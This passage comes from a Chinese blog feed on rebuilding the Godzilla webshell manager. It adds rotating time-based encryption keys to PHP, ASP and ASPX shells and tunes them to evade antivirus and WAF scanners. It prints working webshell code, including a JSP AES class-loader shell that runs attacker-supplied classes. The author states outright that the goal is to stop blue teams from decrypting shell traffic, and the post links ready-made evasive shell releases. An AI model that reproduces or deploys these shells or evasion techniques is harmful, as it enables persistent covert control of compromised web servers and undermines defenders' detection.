class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> gzdecode(encode(base64_decode(urldecode(<span class="string">&quot;fL1tMGI4YTljMn57Hn1UB6v7qeNJ8EnZKTDH/tKI4/eBVFWTRgtWLK0ZfB8cNRIzPu0bNVk4YTk=&quot;</span>)),<span class="variable">$key</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> encode(base64_decode(urldecode(<span class="string">&quot;fL1tMGI4YTljMn57Hn1UB6v7qeNJ8EnZKTDH/tKI4/eBVFWTRgtWLK0ZfB8cNRIzPu0bNVk4YTk=&quot;</span>)),<span class="variable">$key</span>);</span><br></pre></td></tr></table></figure><p>代码太长了，简单说一下，就是各种功能的一些函数，如文件读取，创建，命令执行等等很多。</p><p>也就是说，哥斯拉会把所有的功能储存到一个session中，后面执行命令的时候，直接调用函数，在进行传参就可以了。然后close掉。</p><p>这是点击测试的流程。</p><p>下面是执行命令的流程。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145104840.png" alt="image-20250106145104840"></p><p>当我们点击进入后，会有三个包</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145426293.png" alt="image-20250106145426293"></p><p>第一个就是特别长的包，包含所有功能，存储到一个session中</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106145741094.png" alt="image-20250106145741094"></p><p>然后就是发送测试包，没有问题的话，就是发送getBasicsInfo包获取基本信息了。</p><p>这里就是有一个问题，假设我们在<code>06 January 2025 15:00</code>点击进入页面，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106150249553.png" alt="image-20250106150249553"></p><p>那么，当我们点击进入页面后，就会使用<code>06 January 2025 15:00</code>的key去异或所有的功能的那个包然后存储到sessionid中，那么问题来了，当时间为<code>06 January 2025 15:01</code> 时，key就会变化，也就是说木马变了。而调用sessionid中的功能的key变化了，所以进入的这个页面就不能用了。</p><p>那么我们就可以遇到一个问题，不能实时的动态key了。退而求其次，笔者这里采用十分钟一次和60分钟一次。</p><p>10min:我们将key设为<code>06 January 2025 15:0</code>时，那么这个终端就可以使用十分。有同学问了，如果是15：09连上的，能用几分钟，显然，能用一分钟，下一分钟时间变成了<code>06 January 2025 15:1</code>，就不能用了。</p><p>60min:我们将key设为<code>06 January 2025 15</code>时，那么这个终端就可以使用十分。有同学问了，如果是15：50连上的，能用几分钟，显然，能用10分钟，下10分钟时间变成了<code>06 January 2025 16</code>，就不能用了。</p><p>好，如果不能用了后，怎么再次使用，其实很简单，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154650833.png" alt="image-20250106154650833"></p><p>这个页面，关与不关都无所谓，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154746122.png" alt="image-20250106154746122"></p><p>只需从新点击进入即可，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154815100.png" alt="image-20250106154815100"></p><p>接着用。如果大家渗透测试的时候，如果打开了一个文件，或者扫描了什么，都不影响，只要不关掉即可。关掉了也没事，就是在想截图的时候，就截不到了。<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106154853081.png" alt="image-20250106154853081"></p><p>tips:当执行命令，执行完后，返回null或者啥也不返回，先看时间或者从新进入一次，再怀疑是不是被应急了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106155133587.png" alt="image-20250106155133587"></p><p>怕影响同学们的使用体验，十分钟就要退出一次，可能有点频繁，所以笔者这里也做了60min的过期时间，当然如果，恰巧在12：59分的话，也没有办法，那就从新点进入一下吧。</p><p>有小伙伴可能有疑惑，能不能再长一点时间，其实我是不建议的，为什么呢？假设我们设置了个一天的，那确实不用一直退出了，但是key就不变化了，那么也就是说，跟原来的不动态key加密没有什么区别了，设成一天，还不如直接用定死的key，所以这里没有定义一天的。我们做动态key的初衷就是让运维人员不好解密我们的流量或者解密流量难一些，定义一天流量解密变得简单了，所以暂时先不做吧。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106170342545.png" alt="image-20250106170342545"></p><p>当然，当你使用动态key的木马后，就不能使用自己的key了，在连接时输入的key也不起作用了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250107102102047.png" alt="image-20250107102102047"></p><p>大家记得，用的时候先去生成哦。</p><p>还有一个小事，因为我们动态key的木马连接的时候不需要输入key了，相应的，别人有密码就可以连接你的木马，所以我们使用的时候，尽量把密码设置的复杂一些，自己辛辛苦苦打的成果别让人家上了车。</p><p>这里就不写代码过程了，大家直接下载就好了。</p><h5 id="jsp-实现动态密钥（暂未实现）"><a href="#jsp-实现动态密钥（暂未实现）" class="headerlink" title="jsp 实现动态密钥（暂未实现）"></a>jsp 实现动态密钥（暂未实现）</h5><p>由于笔者能力太菜，jsp的暂未实现。</p><p>为什么没能实现呢，大概就是，木马在声明标签&lt;%! %&gt;中定义了key，但是当我们把时间定义为key后，key是不变化的。当这个文件被创建时，就定死了。所以达不到动态的。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250109105239865.png" alt="image-20250109105239865"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250109105251342.png" alt="image-20250109105251342"></p><p>无论怎么刷新，都不能改变上面的时间了。只有在&lt;%! %&gt;中定义才可以。但是aes解密又解不了了。暂时还没研究明白，先搁置把。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%! </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(ClassLoader z)</span></span>&#123;<span class="keyword">super</span>(z);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">Q</span><span class="params">(<span class="keyword">byte</span>[] cb)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;String ret = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;<span class="keyword">return</span> ret; &#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception </span>&#123;Class base64;String value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object Encoder = base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> Class[] &#123; <span class="keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;Class base64;<span class="keyword">byte</span>[] value = <span class="keyword">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);Object decoder = base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="keyword">null</span>).invoke(base64, <span class="keyword">null</span>);value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>); Object decoder = base64.newInstance(); value = (<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">try</span>&#123;</span><br><span class="line">String pass=<span class="string">&quot;pass&quot;</span>;</span><br><span class="line">String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] dataa=base64Decode(request.getParameter(pass));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cipher c = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    <span class="comment">// Initialize for encryption (1) or decryption (2)</span></span><br><span class="line">c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[] data = c.doFinal(dataa);  <span class="comment">// Encrypt the data</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 编码的时间3: &quot; + data + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line"><span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>)==<span class="keyword">null</span>)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session.setAttribute(<span class="string">&quot;payload&quot;</span>,<span class="keyword">new</span> X(<span class="keyword">this</span>.getClass().getClassLoader()).Q(data));&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;request.setAttribute(<span class="string">&quot;parameters&quot;</span>,data);</span><br><span class="line">java.io.ByteArrayOutputStream arrOut=<span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">Object f=((Class)session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 编码的时间: &quot; + f + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line">f.equals(arrOut);</span><br><span class="line">Cipher d = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    d.init(<span class="number">1</span>,<span class="keyword">new</span> SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">    <span class="keyword">byte</span>[] data2 = d.doFinal(arrOut.toByteArray());  <span class="comment">// Decrypt the data</span></span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 编码的时间: &quot; + arrOut + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line"> String sss=<span class="keyword">new</span> String(base64Decode(<span class="string">&quot;eyJtZXNzYWdlIjoi&quot;</span>));</span><br><span class="line">    String ddd=<span class="keyword">new</span> String(base64Decode(<span class="string">&quot;In0=&quot;</span>));</span><br><span class="line"></span><br><span class="line">f.equals(pageContext);</span><br><span class="line"><span class="comment">//response.getWriter().write(&quot;Base64 编码的时间: &quot; + pageContext + &quot;&lt;br&gt;&quot;);</span></span><br><span class="line">response.getWriter().write(sss);</span><br><span class="line">f.toString();</span><br><span class="line">response.getWriter().write(base64Encode(data2));</span><br><span class="line">response.getWriter().write(ddd);&#125; &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果有大牛感兴趣，可以帮帮我，欢迎留言。</p><h5 id="asp-实现动态密钥"><a href="#asp-实现动态密钥" class="headerlink" title="asp 实现动态密钥"></a>asp 实现动态密钥</h5><p>asp和php的差不多，</p><p>我们原版的木马中，并不带md5函数，我们要获取md5  进行实时加密么，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Function MD5(text)</span><br><span class="line">    With CreateObject(&quot;MSXML.DOMDocument&quot;).createElement(&quot;a&quot;)</span><br><span class="line">.dataType = &quot;bin.hex&quot;</span><br><span class="line">.nodeTypedvalue = CreateObject(&quot;System.Security.Cryptography.MD5CryptoServiceProvider&quot;).ComputeHash_2(CreateObject(&quot;System.Text.UTF8Encoding&quot;).GetBytes_4(text))</span><br><span class="line">MD5 = .text</span><br><span class="line">        End With</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure><p>网上找个md5加密，对取到的时间进行md5就可以了，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162516852.png" alt="image-20250110162516852"></p><p>就可以获取到key了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162801008.png" alt="image-20250110162801008"></p><p>同样的，60分钟的也做好了。</p><p>我们配合我们的免杀，一起封装到godzilla里</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162854098.png" alt="image-20250110162854098"></p><p>使用的时候，先进行生成</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110162932114.png" alt="image-20250110162932114"></p><p>一种10min，一种60min的，生成的时候，key不用管，填写了key，也不生效了。</p><p>只用填pass，记得设复杂一点。</p><p>上传，使用连接即可，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163028486.png" alt="image-20250110163028486"></p><p>连接的时候，选择即可。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163102386.png" alt="image-20250110163102386"></p><p>进入。执行命令即可。</p><p>asp和php的判断是否时间到期有一丢丢区别，就是，如果到时间了，不能用了，不会显示空，而是显示一些乱码，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110163246095.png" alt="image-20250110163246095"></p><p>没有关系，从新点进入即可。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110164330274.png" alt="image-20250110164330274"></p><p>当到期后，不会显示null，会显示一个乱码，见上图。就是过期了，从新进入就可以了。</p><p>和php一样，当16：49分时就能用一分钟了，需要从新进入了。</p><p>好，简单试下免杀，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250110164643501.png" alt="image-20250110164643501"></p><p>其他平台就不试了，应该也没问题。</p><p>好，asp就到这里。下面aspx。</p><h5 id="aspx-实现动态密钥"><a href="#aspx-实现动态密钥" class="headerlink" title="aspx 实现动态密钥"></a>aspx 实现动态密钥</h5><p>原理都是一样的，改改代码即可。</p><p>aspx 实现md5 FormsAuthentication.HashPasswordForStoringInConfigFile(str, “MD5”)</p><p>然后获取一下时间，即可，</p><p>Response.Write(currentDate.ToString(“yyyy-MM-dd HH:mm:ss”));</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114202059.png" alt="image-20250113114202059"></p><p>然后这里，我们将时间进行md5，再然后截取即可。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114400702.png" alt="image-20250113114400702"></p><p>大概这样，好，我们先来个十分钟的进行测试一下啊。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114736675.png" alt="image-20250113114736675"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114804784.png" alt="image-20250113114804784"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113114830763.png" alt="image-20250113114830763"></p><p>使用起来没有问题。当十分钟后，时间到期了</p><p>显示的内容和php的一样，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115047127.png" alt="image-20250113115047127"></p><p>会什么也不返回。这时候，从新进入既可以了</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115320481.png" alt="image-20250113115320481"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115450558.png" alt="image-20250113115450558"></p><p>同样的，给大家准备了，两个时间版本供选择，10min和60min的。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113115758077.png" alt="image-20250113115758077"></p><p>接下了，将木马封装到godzilla中。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113135939818.png" alt="image-20250113135939818"></p><p>生成木🐎</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140037262.png" alt="image-20250113140037262"></p><p>两种选择，都加了免杀效果。大家记得使用的时候把pass设置复杂一些，防止上车。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140617749.png" alt="image-20250113140617749"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140429466.png" alt="image-20250113140429466"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250113140501275.png" alt="image-20250113140501275"></p><p>使用都没啥问题。好，asp也写完成了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>本文对php、jsp、asp、aspx四种语言尝试实现动态密钥，但是遗憾是jsp语言暂未实现。如果有大牛有兴趣可以研究一下。</p><p>php、asp、aspx三种语言都实现了，动态密钥生成连接。都为10min和60min两种选择。</p><p>php：PHP_XOR_BASE64_MESSAGE_60min、PHP_XOR_BASE64_MESSAGE_10min</p><p>asp：ASP_XOR_BASE64_MESSAGE_data10min、ASP_XOR_BASE64_MESSAGE_data60min</p><p>aspx：CSHAP_AES_BASE64_DATA_10min、CSHAP_AES_BASE64_DATA_60min</p><h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>大家可以发现，该版本我写的文章较少，有许多代码都没有详细的写出来，一些时间的获取上，都没有列出来，为的就是大家可以多使用一些时间。所以这个版本笔者先暂不公布代码，下个版本在进行公布在github。</p><p>1.2版本实现动态密钥获取，但是并没有改流量以及加密方式，只是做了伪装，<br>后面需要做的：修改一下加密方式，这样的话会更好一点。还有就是message其实是固定的，希望能让他动起来。还有传递的参数 page=1&amp;size=10 是固定的，让他也动起来，比如Accept-Language、User-Agent这种header头实现动态的 。其他语言的 比如 jspf的 ，asmx的都没做，笔者后面做。</p><p><code>这里收集个建议，就是说，我们实现了 10min和60min的换密钥，笔者在测试的时候，其实是可以实现1分钟，或者任意时间换密钥的，就是想问下，需不需要1min这种shell，就是我就不想让蓝队那么快解密，甚至解不出来、但是比较极限，执行两条三条命令就要从新点击进入，有些麻烦，或者其他想法。留言即可。</code></p><h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><p>release 1.0 流量修改版本，src代码也以上传，大家直接下载研究即可。</p><p>release 1.1 免杀版本，src代码也以上传，大家直接下载研究即可。</p><p>release 1.2 流量修改+免杀+动态密钥版本，大家直接下载使用即可。</p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            致敬原版哥斯拉</span><br><span class="line">https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A   冰蝎v4.0传输协议详解</span><br><span class="line">https://yzddmr6.com/posts/antsword-xor-encoder/   蚁剑实现动态秘钥编码器解码器</span><br></pre></td></tr></table></figure><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> 二开 </tag>
            
            <tag> 动态密钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哥斯拉二开从0到1-2(免杀)</title>
      <link href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/"/>
      <url>/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>有小伙伴提议说，我们上个文章改了一下哥斯拉的流量，但是在实际的应用中，我们打战肯定要先传木马落地，如果不能落地，那么你流量改的再好，其实也没有意义，想想，确实也是。没有第一步上传文件，哪里存在流量呢。</p><p>那么这次咱们来做一下免杀。在实际的应用中，似乎我们经常碰到安全设备，奈何咱这也没有啥安全设备，我们就采用常见的厂商的在线杀软吧。如果有小伙伴有的话，可以帮我测测，把结果告诉我，笔者再进行优化。</p><h5 id="php-免杀"><a href="#php-免杀" class="headerlink" title="php 免杀"></a>php 免杀</h5><p>我们用默认生成的文件，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118113734653.png" alt="image-20241118113734653"></p><p>拖到d盾中，看一下</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118114632737.png" alt="image-20241118114632737"></p><p>会报3级的双层变量，那好办，拿出来就行</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118114954546.png" alt="image-20241118114954546"></p><p>让他先等于一个变量，在传递就可以了。</p><p>完事之后，就可以了</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118150517857.png" alt="image-20241118150517857"></p><p>没有a.php了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152210198.png" alt="image-20241118152210198"></p><p>河马报毒，我们使用fuzz方法看一下哪里有问题。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152338008.png" alt="image-20241118152338008"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152350132.png" alt="image-20241118152350132"></p><p>这里经过fuzz，这里有<code>$qianxinITUfjjXmxo2($_POST[$qianxinw7hJzkKxyi])</code>的时候，那么就报毒，那简单，直接给他拆出来，用变量写。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152548119.png" alt="image-20241118152548119"></p><p>这样写，就可以了</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118152645497.png" alt="image-20241118152645497"></p><p>这里本地版的河马是没有问题了，但是吧，在线版的河马就是过不去，只要出现eval，就直接报。暂时没有太好的办法。在线加密也行，不过比较麻烦。这里就不写了</p><p>像d盾河马这种都是静态查杀的，他不管你里面的内容是什么，出现eval这种或者eval()  eval(chuanchan) 就会报，d盾还好解决一点，用类可以绕，但是把  河马死活绕不过，先搁下吧。</p><p>实际中，我们经常会见到一下商业waf，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118171049436.png" alt="image-20241118171049436"></p><p>微步没报，但是他这个gtp说可能有问题。</p><p>火绒和360。火绒和360对webshell其实是不敏感的，终端安全，对cs 或者msf的🐎都比较敏感，所以感觉这个，没啥意义。也测一下吧。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118182716236.png" alt="image-20241118182716236"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241118182735288.png" 